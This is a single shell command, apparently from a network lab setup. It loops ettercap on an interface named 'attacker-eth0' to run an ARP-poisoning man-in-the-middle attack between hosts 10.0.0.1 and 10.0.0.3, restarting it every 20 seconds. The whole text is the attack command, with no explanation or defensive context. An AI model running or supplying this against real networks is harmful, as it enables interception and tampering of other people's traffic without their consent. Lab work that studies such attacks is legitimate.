while :; ettercap -T -i attacker-eth0 -M arp:remote /10.0.0.1// /10.0.0.3// -s 's(30)q'; do sleep 20; done
